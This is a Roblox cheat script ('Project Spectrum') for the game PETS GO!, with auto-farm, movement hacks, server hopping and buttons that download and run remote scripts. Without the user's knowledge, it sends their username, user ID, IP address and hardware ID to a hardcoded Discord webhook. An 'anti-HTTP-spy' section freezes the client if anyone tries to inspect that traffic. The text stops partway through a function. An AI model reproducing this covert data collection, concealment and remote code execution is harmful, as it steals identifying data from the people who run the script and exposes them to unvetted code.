-- Anti-Http Spy
task.spawn(function()
    hookfunction(print, function(a) if string.find(a:lower(), "http") then while true do end end end)
    hookfunction(warn, function(a) if string.find(a:lower(), "http") then while true do end end end)
    hookfunction(error, function(a) if string.find(a:lower(), "http") then while true do end end end)
    local oldwrite  oldwrite = hookfunction(writefile, function(file, content)  if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then  while true do end  return end     return oldwrite(file, content) end)
    local oldappend oldappend = hookfunction(appendfile, function(file, content) if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then while true do end return end return oldappend(file, content) end)
    game.DescendantAdded:Connect(function(c) if c and c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message') then if string.find(string.lower(c.Text), 'http') then while true do end c:Destroy() end end end)
    getgenv().rconsoletitle = nil getgenv().rconsoleprint = nil getgenv().rconsolewarn = nil getgenv().rconsoleinfo = nil getgenv().rconsolerr = nil getgenv().clonefunction = function(...) while true do end return end
    game.CoreGui.ChildAdded:Connect(function(c) if(string.lower(c.Name) == 'devconsolemaster') then while true do end c:Destroy() end end)
    local oldNamecall oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...) local method = getnamecallmethod()
    if(string.lower(method) == 'rconsoleprint') then while true do end return  end
    if(string.lower(method) == 'rconsoleinfo') then while true do end return end
    if(string.lower(method) == 'rconsolewarn') then while true do end return  end
    if(string.lower(method) == 'rconsoleerr') then while true do end return end
    if(string.lower(method) == 'warn') then while true do end return end
    if(string.lower(method) == 'error') then while true do end return end 
    if(string.lower(method) == 'rendernametag') then while true do end return  end 
    return oldNamecall(self, ...)
    end))
  end)

-- Anti AFK
warn("Anti AFK = Enabled")
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

-- Excute Log
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = "https://discord.com/api/webhooks/1288935834149453875/s_mbWY-_9-HIwwAFEpm70WCay_dstHJwOa4sTSUGiiCqLPyBuNtE-WkzS8irtOy_NDbF",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "** 🔔 Execute Log Notifaction ✧₊⁺ **",
                ["description"] = nil,
                ["footer"] = {
                            ["text"] = "⏳ Execute Time : "..os.date("%c").."\n 🤝 Project Spectrum 8.0 // Made By xZPUHigh\n 🌟 discord.gg/C3MpUNwsDU 🌎",
                            ["icon_url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/received_6268136009875748.jpg?ex=66f44f3f&is=66f2fdbf&hm=a7781334ae91dc5e7d73d148899c1507365a5daf94114d39bcab27e6378f7694&=&format=webp&width=671&height=671"
                            },
                ["thumbnail"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/0"
                                },
                ["image"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1284397366069297182/1294750491087208578/2165c56bd5dc32879c83adf4a83a0c87.gif?ex=670c25dc&is=670ad45c&hm=d3371e7b34dd6ac5107bb85cd1d796f2da5344063a0b92182c63826291c3b30e&="
                                },
                ["fields"] = {
                    {
                        ["name"] = "**👩🏻‍💼 Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**🔖 User ID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**📋 Place ID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌍 IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**📍 Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🍻 Job ID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌟 Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    return AdminMessage
end

PostWebhook("urtl", AdminLoggerMsg())

-- Notify After Excute
local player = game.Players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local notificationFrame = Instance.new("Frame")
notificationFrame.Size = UDim2.new(0, 250, 0, 60)
notificationFrame.Position = UDim2.new(0.5, -125, 0, -70)
notificationFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
notificationFrame.BorderSizePixel = 0
notificationFrame.Parent = screenGui

local notificationCorner = Instance.new("UICorner")
notificationCorner.CornerRadius = UDim.new(0, 10)
notificationCorner.Parent = notificationFrame

local messageLabel = Instance.new("TextLabel")
messageLabel.Size = UDim2.new(1, -20, 1, -30)
messageLabel.Position = UDim2.new(0, 10, 0, 10)
messageLabel.Text = "Welcome To Project Spectrum!"
messageLabel.Font = Enum.Font.Gotham
messageLabel.TextSize = 16
messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
messageLabel.BackgroundTransparency = 1
messageLabel.TextWrapped = true
messageLabel.Parent = notificationFrame

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(1, -20, 0, 4)
progressBar.Position = UDim2.new(0, 10, 1, -14)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = notificationFrame

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(0, 2)
progressBarCorner.Parent = progressBar

notificationFrame:TweenPosition(UDim2.new(0.5, -125, 0, 10), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 0.5, true)

local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Linear)
local progressBarTween = tweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(0, 0, 0, 4)})
progressBarTween:Play()

wait(5)

notificationFrame:TweenPosition(UDim2.new(0.5, -125, 0, -70), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 0.5, true, function()
    screenGui:Destroy()
end)

-- Credit
wait(.1)
print("Project Spectrum...")
wait(0)
print("Founder/ ZPU {xZPUHigh}")
wait(0)
print("Last Updated 13/10/24")
--[[
	WARNING: This just BETA PROJECT! This script has not been verified by QC. Use at your own risk! {ZPU}
]]
local ThunderScreen = Instance.new("ScreenGui")
local ThunderToggleUI = Instance.new("TextButton")
local ThunderCornerUI = Instance.new("UICorner")
local ThunderImageUI = Instance.new("ImageLabel")

ThunderScreen.Name = "ThunderScreen"
ThunderScreen.Parent = game.CoreGui
ThunderScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ThunderToggleUI.Name = "ThunderToggleUI"
ThunderToggleUI.Parent = ThunderScreen
ThunderToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
ThunderToggleUI.BorderSizePixel = 0
ThunderToggleUI.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ThunderToggleUI.Size = UDim2.new(0, 50, 0, 50)
ThunderToggleUI.Font = Enum.Font.SourceSans
ThunderToggleUI.Text = ""
ThunderToggleUI.TextColor3 = Color3.fromRGB(0, 0, 0)
ThunderToggleUI.TextSize = 14.000
ThunderToggleUI.Draggable = true
ThunderToggleUI.MouseButton1Click:Connect(
    function()
        game:GetService("VirtualInputManager"):SendKeyEvent(true, "LeftControl", false, game)
        game:GetService("VirtualInputManager"):SendKeyEvent(false, "LeftControl", false, game)
    end
)

ThunderCornerUI.Name = "ThunderCornerUI"
ThunderCornerUI.Parent = ThunderToggleUI

ThunderImageUI.Name = "Project Spectrum"
ThunderImageUI.Parent = ThunderToggleUI
ThunderImageUI.BackgroundColor3 = Color3.fromRGB(111, 0, 255)
ThunderImageUI.BackgroundTransparency = 1.000
ThunderImageUI.BorderSizePixel = 0
ThunderImageUI.Position = UDim2.new(0.0, 0, 0.0, 0)
ThunderImageUI.Size = UDim2.new(0, 50, 0, 50)
ThunderImageUI.Image = "http://www.roblox.com/asset/?id=15568727833"

-- Interface GUI & Function

local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Library.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Local.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Manager.lua"))()
local UserInputService = game:GetService("UserInputService")

local Window = Fluent:CreateWindow({
    Title = "PETS GO! ✨ | Project Spectrum 8.0",
    SubTitle = "by xZPUHigh & Special Edition",
    TabWidth = 130,
    Size = UDim2.fromOffset(500, 400),
    Acrylic = true, 
    Transparency = false,
    Theme = "Black",
    MinimizeKey = Enum.KeyCode.LeftControl 
})

local Tabs = {
    Main = Window:AddTab({ Title = "General Tabs", Icon = "home" }),
    Auto = Window:AddTab({ Title = "Automatics", Icon = "mouse-pointer-click" }),
    Shop = Window:AddTab({ Title = "Vendings", Icon = "shopping-cart" }),
     Visuals = Window:AddTab({Title = "Visuals", Icon = "album"}),
     Misc = Window:AddTab({Title = "Miscellaneous", Icon = "list-plus"}),
     Webhook = Window:AddTab({Title = "Webhooks", Icon = "bell"}),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local Options = Fluent.Options

do

-- Roll & Upgrades Features

Tabs.Main:AddSection("Roll & Upgrades Features")

Tabs.Main:AddParagraph(
    {
        Title = "Information",
        Content = "You can auto farm with this shit so ez if you enable all function this like Auto Play and you can AFK :D"
    }
)

local Toggle = Tabs.Main:AddToggle("Eggs_RollsValue", {Title = "Auto Rolls [Skip Animation]", Description = "- Automatic Roll and Skip Animation", Default = false})

Toggle:OnChanged(function()
    getgenv().Eggs_Roll = Options.Eggs_RollsValue.Value

    if getgenv().Eggs_Roll then
        startEggsRollLoop()
    else
        getgenv().Eggs_Roll = false
    end
end)

function startEggsRollLoop()
    spawn(function()
        while getgenv().Eggs_Roll do 
            wait(SpeedEggs)
            game:GetService("ReplicatedStorage").Network.Eggs_Roll:InvokeServer()
        end
    end)
end

local Slider = Tabs.Main:AddSlider("Slider", {
    Title = "Deley Rolls",
    Description = "* Recommend Default Is 1 But 0 Is Better FAST!!",
    Default = 1, 
    Min = 0,    
    Max = 10,  
    Rounding = 1, 
    Callback = function(Value)
        getgenv().SpeedEggs = Value
    end
})

local Toggle = Tabs.Main:AddToggle("UpgradesValue", {Title = "Auto Upgrades", Description = "Upgrades must also be open. If you want to specify Upgrades, just click on something and it will be done automatically", Default = false})

Toggle:OnChanged(function()
    getgenv().Upgrades = Options.UpgradesValue.Value

    if getgenv().Upgrades then
        startUpgradesRollLoop()
    else
        getgenv().Upgrades = false
    end
end)

function startUpgradesRollLoop()
    spawn(function()
        while getgenv().Upgrades do
            local upgradesFolder = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Upgrades") and workspace.__THINGS.Upgrades:FindFirstChild("Upgrades Frontend Render")

            if upgradesFolder then
  

                local function convertShortenedNumber(shortened)
                    if string.find(shortened, "k") then
                        local number = string.gsub(shortened, "k", "")
                        return tonumber(number) * 1000
                    elseif string.find(shortened, "m") then
                        local number = string.gsub(shortened, "m", "")
                        return tonumber(number) * 1000000
                    elseif string.find(shortened, "b") then
                        local number = string.gsub(shortened, "b", "")
                        return tonumber(number) * 1000000000
                    else
                        return tonumber(shortened)
                    end
                end
                
                local lowestPrice = math.huge
                local lowestUpgradeName = nil
                
                for _, upgrade in pairs(upgradesFolder:GetChildren()) do
                    if upgrade:FindFirstChild("Price") and upgrade.Price:FindFirstChild("SurfaceGui") and upgrade.Price.SurfaceGui:FindFirstChild("Price") then
                        local priceLabel = upgrade.Price.SurfaceGui.Price
                        local priceText = convertShortenedNumber(priceLabel.ContentText)
                        
                        if priceText and priceText < lowestPrice then
                            lowestPrice = priceText
                            lowestUpgradeName = upgrade.Name
                        end
                    end
                end
                
                if lowestUpgradeName then
                    local args = {
                        [1] = lowestUpgradeName
                    }
                
                    game:GetService("ReplicatedStorage").Network.Upgrades_Purchase:InvokeServer(unpack(args))
                end
            end

            wait(SpeedUpgrades)
        end
    end)
end

local Slider = Tabs.Main:AddSlider("Slider", {
    Title = "Process Upgrades Speed",
    Description = "* Increase the speed of process refresh or update rate",    
    Default = 1, 
    Min = 0,    
    Max = 10,  
    Rounding = 1, 
    Callback = function(Value)
        getgenv().SpeedUpgrades = Value
    end
})

-- Automatics Features

Tabs.Auto:AddSection("Automatics Features")
    
    local Toggle = Tabs.Auto:AddToggle("AutoFarmorbs", {Title = "Auto Farm", Default = false})

    Toggle:OnChanged(function()
        getgenv().AutoFarmorb = Options.AutoFarmorbs.Value
    
        if getgenv().AutoFarmorb then
            startAutoFarmorbRollLoop()
        else
            getgenv().AutoFarmorb = false
        end
    end)
    
    function startAutoFarmorbRollLoop()
        spawn(function()
            while wait(SpeedAutoFarmOrbs) do
                if getgenv().AutoFarmorb then
                    local petsFolder = workspace.__THINGS.Pets
                    local breakablesFolder = workspace.__THINGS.Breakables
                    
                    local petNames = {}
                    for _, pet in pairs(petsFolder:GetChildren()) do
                        if tonumber(pet.Name) then  
                            table.insert(petNames, pet.Name)
                        end
                    end
                    
                    local breakableNumbers = {}
                    for _, breakable in pairs(breakablesFolder:GetChildren()) do
                        if tonumber(breakable.Name) then  
                            table.insert(breakableNumbers, breakable.Name)
                        end
                    end
    
                    if #petNames == 0 or #breakableNumbers == 0 then
                        print("Waiting for pets or breakables to appear...")
                        repeat
                            wait(1)
                            
                            petNames = {}
                            for _, pet in pairs(petsFolder:GetChildren()) do
                                if tonumber(pet.Name) then  
                                    table.insert(petNames, pet.Name)
                                end
                            end
                            
                            breakableNumbers = {}
                            for _, breakable in pairs(breakablesFolder:GetChildren()) do
                                if tonumber(breakable.Name) then  
                                    table.insert(breakableNumbers, breakable.Name)
                                end
                            end
                        until #petNames > 0 and #breakableNumbers > 0
                    end
    
                    if getgenv().FarmMode == "Random" then
                        for _, petName in ipairs(petNames) do
                            local randomBreakableNumber = breakableNumbers[math.random(#breakableNumbers)]
                            local args = {
                                [1] = {
                                    [petName] = tonumber(randomBreakableNumber)
                                }
                            }
                            game:GetService("ReplicatedStorage").Network.Breakables_JoinPetBulk:FireServer(unpack(args))
                        end
                    elseif getgenv().FarmMode == "Target One" then
                        local targetBreakableNumber = breakableNumbers[math.random(#breakableNumbers)]
                        for _, petName in ipairs(petNames) do
                            local args = {
                                [1] = {
                                    [petName] = tonumber(targetBreakableNumber)
                                }
                            }
                            game:GetService("ReplicatedStorage").Network.Breakables_JoinPetBulk:FireServer(unpack(args))
                        end
                    end
                end
            end
        end)
    end
    
    local Toggle = Tabs.Auto:AddToggle("orbValue", {Title = "Auto Collect Orbs", Default = false})

Toggle:OnChanged(function()
    getgenv().orbValues = Options.orbValue.Value

    if getgenv().orbValues then
        startorbRollLoop()
    else
        getgenv().orbValues = false
    end
end)

function startorbRollLoop()
    spawn(function()
        while wait() do
                if getgenv().orbValues then
             local orbsFolder = workspace.__THINGS.Orbs

                local orbNumbers = {}
                for _, orb in pairs(orbsFolder:GetChildren()) do
                    table.insert(orbNumbers, orb.Name) 
                end
                
                for _, orbNumber in pairs(orbNumbers) do
                    local args = {
                        [1] = {
                            [1] = tonumber(orbNumber) 
                        }
                    }
                
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Orbs: Collect"):FireServer(unpack(args))
                
                    local orbToRemove = orbsFolder:FindFirstChild(orbNumber)
                    if orbToRemove then
                        orbToRemove:Destroy()
                    end
                end
                end
            end
        end)
    end

    local Slider = Tabs.Auto:AddSlider("Slider", {
        Title = "Farming Settings",
        Description = "Adjust the speed at which pets switch between targets during auto farming",
        Default = 1, 
        Min = 0,    
        Max = 10,  
        Rounding = 1, 
        Callback = function(Value)
            getgenv().SpeedAutoFarmOrbs = Value
        end
    })

    local Dropdown = Tabs.Auto:AddDropdown("FarmMode", {
        Title = "Select Method",
        Values = {"Random", "Target One"},
        Multi = false,
        Default = 1,
    })
    
    Dropdown:SetValue("Random")
    
    Dropdown:OnChanged(function(Value)
        getgenv().FarmMode = Value
        print("Farming mode changed:", Value)
    end)

-- Vending & Craft Features

    Tabs.Shop:AddSection("Vending & Craft Features")

    Tabs.Shop:AddButton({
        Title = "Buy Potion Vending Machine",
         Callback = function()
            local args = {
                [1] = "PotionVendingMachine"
            }
            
            game:GetService("ReplicatedStorage").Network.VendingMachines_Purchase:InvokeServer(unpack(args))            
        end
    })

    local Toggle = Tabs.Shop:AddToggle("PotionVendingMachineValue", {Title = "Auto Buy Potion Vending Machine", Default = false})

Toggle:OnChanged(function()
    getgenv().AutoPotionVendingMachine = Options.PotionVendingMachineValue.Value

    if getgenv().AutoPotionVendingMachine then
        AutoPotionVendingMachineLoop()
    else
        getgenv().AutoPotionVendingMachine = false
    end
end)

function AutoPotionVendingMachineLoop()
    spawn(function()
        while getgenv().AutoPotionVendingMachine do 
            wait(3)
            local args = {
                [1] = "PotionVendingMachine"
            }
            
            game:GetService("ReplicatedStorage").Network.VendingMachines_Purchase:InvokeServer(unpack(args))     
        end
    end)
end



    local contentFolder = game:GetService("Players").LocalPlayer.PlayerGui._MACHINES.CraftingMachine.Frame.UsingFrame.Content

    local minValue = math.huge
    local maxValue = -math.huge
    
    for _, item in pairs(contentFolder:GetChildren()) do
        if tonumber(item.Name) then
            local number = tonumber(item.Name)
            if number < minValue then
                minValue = number 
            end
            if number > maxValue then
                maxValue = number
            end
        end
    end
    
    if minValue == math.huge then
        minValue = 1
    end
    
    if maxValue == -math.huge then
        maxValue = 18 
    end
    
    local Slider = Tabs.Shop:AddSlider("Slider", {
        Title = "Number Buy Potion Crafting Machine",
        Description = "The number you want to buy from the Potion Crafting Machine store in numerical order",
        Default = 1,
        Min = minValue, 
        Max = maxValue, 
        Rounding = 1,
        Callback = function(Value)
            getgenv().PotionCraftingMachinenumber = Value
        end
    })

    local function getClosestNumber(target, numbers)
        local closest = numbers[1]  
        for _, num in ipairs(numbers) do
            if math.abs(num - target) < math.abs(closest - target) then
                closest = num  
            end
        end
        return closest
    end
    
    Tabs.Shop:AddButton({
        Title = "Potion Crafting Machine",
        Callback = function()
            local potionCraftingMachineNumber = getgenv().PotionCraftingMachinenumber 
            local numbers = {}
    
            for _, item in pairs(contentFolder:GetChildren()) do
                if tonumber(item.Name) then
                    table.insert(numbers, tonumber(item.Name))  
                end
            end
    
         
            local closestNumber = getClosestNumber(potionCraftingMachineNumber, numbers)
    
          
            local args = {
                [1] = "PotionCraftingMachine",
                [2] = closestNumber  
            }
    
            game:GetService("ReplicatedStorage").Network.CraftingMachine_Craft:InvokeServer(unpack(args))               
        end
    })    

 local Farm4141rqwqd4 = Tabs.Visuals:AddSection("Visuals Features")

-- Visuals
Tabs.Shop:AddButton({
	Title = "Infinite Coin",
	Description = "???",
	Callback = function()
    game:GetService("Players").LocalPlayer.PlayerGui.Main.Top.Coins.Amount.Text = "8e91"
end
})

    local Farm41vfcsd414 = Tabs.Misc:AddSection("Players Features")


    local Slider = Tabs.Misc:AddSlider("Slider", {
        Title = "WalkSpeed",
        Description = "Adjust the speed of a personal player",
        Default = 16,
        Min = 0,
        Max = 500,
        Rounding = 1,
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
        end
    })

        Tabs.Misc:AddButton({
        Title = "Reset WalkSpeed",
        Description = "Reset WalkSpeed normal",
        Callback = function()
            Window:Dialog({
                Title = "Reset WalkSpeed",
                Content = "Are you sure you want to reset the WalkSpeed?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })


    
    local Slider = Tabs.Misc:AddSlider("Slider", {
        Title = "JumpPower",
        Description = "Adjust the JumpPower of a personal player",
        Default = 50,
        Min = 0,
        Max = 500,
        Rounding = 1,
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
        end
    })

        Tabs.Misc:AddButton({
        Title = "Reset JumpPower",
        Description = "Reset JumpPower normal",
        Callback = function()
            Window:Dialog({
                Title = "Reset JumpPower",
                Content = "Are you sure you want to reset the JumpPower?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                   game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })


    local Toggle = Tabs.Misc:AddToggle("MyToggle", {Title = "InfiniteJump", Default = false})

    Toggle:OnChanged(function()
        getgenv().InfiniteJumpEnabled = Options.MyToggle.Value
    end)
    
    Options.MyToggle:SetValue(false)
    
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer
    
    UserInputService.JumpRequest:Connect(function()
        if getgenv().InfiniteJumpEnabled then
          
            if Player.Character and Player.Character:FindFirstChildOfClass('Humanoid') then
                local Humanoid = Player.Character:FindFirstChildOfClass('Humanoid')
                Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end)


    local Toggle = Tabs.Misc:AddToggle("AntiAFKEnableds", {Title = "Anti AFK", Default = true})

    Toggle:OnChanged(function()
        getgenv().AntiAFKEnabled = Options.AntiAFKEnableds.Value

        if getgenv().AntiAFKEnabled then
            startAntiAFK()
        else
            getgenv().AntiAFKEnabled = false
        end
    end)


    function startAntiAFK()
        spawn(function()
    local VirtualUser = game:service'VirtualUser'
    game:service'Players'.LocalPlayer.Idled:connect(function()
        while getgenv().AntiAFKEnabled do
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
            print("Prevented AFK kick.")
        end
    end)
end)
end




    
local Farm41vfc414 = Tabs.Misc:AddSection("Scripts Features")


    Tabs.Misc:AddButton({
        Title = "Infinite Yield",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Infinite Yield",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
                                end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Misc:AddButton({
        Title = "fates admin",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "fates admin",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Misc:AddButton({
        Title = "Hydroxide",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Hydroxide",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

 local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Misc:AddButton({
        Title = "SimpleSpy",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "SimpleSpy",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Misc:AddButton({
        Title = "Dex V4",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Dex V4",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
                                        end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })

    Tabs.Misc:AddButton({
        Title = "Dex V3",
        Description = "",
        Callback = function()
            Window:Dialog({
                Title = "Dex V3",
                Content = "Are you sure you want to activate the script?",
                Buttons = {
                    {
                        Title = "Yes",
                        Callback = function()

                            loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
                                                end
                    },
                    {
                        Title = "No",
                        Callback = function()
                        end
                    }
                }
            })
        end
    })


    Tabs.Misc:AddButton(
        {
            Title = "Admin Commands (UI)",
            Description = nil,
            Callback = function()
                Window:Dialog(
                    {
                        Title = "Open Admin Commands GUI",
                        Content = "you really wannt to open admin commands gui right?",
                        Buttons = {
                            {
                                Title = "Sure",
                                Callback = function()
                                    loadstring(
                                        game:HttpGet(
                                            ("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),
                                            true
                                        )
                                    )()
                                end
                            },
                            {
                                Title = "Cancel",
                                Callback = function()
                                    print("Cancelled")
                                end
                            }
                        }
                    }
                )
            end
        }
    )
    
    local Farm41vfc4ve1414 = Tabs.Misc:AddSection("Functions Features")

    Tabs.Misc:AddButton(
        {
            Title = "Rejoin",
            Description = "Rejoin The Server",
            Callback = function()
                Window:Dialog(
                    {
                        Title = "Teleport",
                        Content = "Are you sure?",
                        Buttons = {
                            {
                                Title = "Confirm",
                                Callback = function()
                                    print("Teleported")
                                    game:GetService("TeleportService"):Teleport(
                                        game.PlaceId,
                                        game:GetService("Players").LocalPlayer
                                    )
                                end
                            },
                            {
                                Title = "Cancel",
                                Callback = function()
                                    print("Cancelled")
                                end
                            }
                        }
                    }
                )
            end
        }
    )
end

Tabs.Misc:AddButton(
    {
        Title = "Hop Server",
        Description = "",
        Callback = function()
            Hop()
        end
    }
)

function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
        local Site
        if foundAnything == "" then
            Site =
                game.HttpService:JSONDecode(
                game:HttpGet(
                    "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
                )
            )
        else
            Site =
                game.HttpService:JSONDecode(
                game:HttpGet(
                    "https://games.roblox.com/v1/games/" ..
                        PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything
                )
            )
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0
        for i, v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _, Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile =
                                pcall(
                                function()
                                    AllIDs = {}
                                    table.insert(AllIDs, actualHour)
                                end
                            )
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(
                        function()
                            wait()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(
                                PlaceID,
                                ID,
                                game.Players.LocalPlayer
                            )
                        end
                    )
                    wait(4)
                end
            end
        end
    end
    function Teleport()
        while wait() do
            pcall(
                function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                    end
                end
            )
        end
    end
    Teleport()
end

Tabs.Misc:AddButton(
    {
        Title = "Hop Server [ Low Player ]",
        Description = "",
        Callback = function()
            getgenv().AutoTeleport = true
            getgenv().DontTeleportTheSameNumber = true
            getgenv().CopytoClipboard = false
            if not game:IsLoaded() then
                print("Game is loading waiting...")
            end
            local maxplayers = math.huge
            local serversmaxplayer
            local goodserver
            local gamelink =
                "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            function serversearch()
                for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync(gamelink)).data) do
                    if type(v) == "table" and v.playing ~= nil and maxplayers > v.playing then
                        serversmaxplayer = v.maxPlayers
                        maxplayers = v.playing
                        goodserver = v.id
                    end
                end
            end
            function getservers()
                serversearch()
                for i, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync(gamelink))) do
                    if i == "nextPageCursor" then
                        if gamelink:find("&cursor=") then
                            local a = gamelink:find("&cursor=")
                            local b = gamelink:sub(a)
                            gamelink = gamelink:gsub(b, "")
                        end
                        gamelink = gamelink .. "&cursor=" .. v
                        getservers()
                    end
                end
            end
            getservers()
            if AutoTeleport then
                if DontTeleportTheSameNumber then
                    if #game:GetService("Players"):GetPlayers() - 4 == maxplayers then
                        return warn("It has same number of players (except you)")
                    elseif goodserver == game.JobId then
                        return warn("Your current server is the most empty server atm")
                    end
                end
